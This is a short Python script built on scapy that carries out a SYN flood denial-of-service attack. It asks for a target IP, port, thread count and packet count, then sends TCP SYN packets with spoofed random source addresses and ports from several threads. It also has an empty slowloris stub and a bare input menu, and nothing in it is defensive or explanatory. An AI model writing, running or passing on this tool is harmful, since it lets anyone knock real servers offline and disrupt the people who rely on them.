#!/usr/bin/python3

import random
import threading
from scapy.all import IP, TCP, send
import threading
import random
import time

choose = input('')

def ping():
    return 'online'

def slowloris():
    pass

class Synflood:
    def __init__(self, ip, port, thread, pack=50):
        self.target = ip
        self.port = port
        self.thread = thread
        self.event = threading.Event()
        self.packet = pack
    def start(self, port="80"):
        self.event.set()
        while self.event.is_set():
            for i in range(self.packet):
                fake_ip = "%d.%d.%d.%d" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
                rand_port = random.randint(0, 65535)
                send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
            self.event.clear()
        print("Thread finished\n")

    def sf(self):
        threads =[]
        for i in range(self.thread):
            th = threading.Thread(target=self.start)
            th.start()
            threads.append(th)
        return threads
    def stop(self):
        self.event.clear()

if choose == '1':
    ip = input('')
    port = int(input(''))
    threadd = int(input(''))
    pack = int(input(''))
    syn = Synflood(ip, port, threadd,pack)
    try:
        syn.sf()
    except KeyboardInterrupt:
        syn.stop()
if choose == '2':
    pass
if choose == '3':
    print('online')
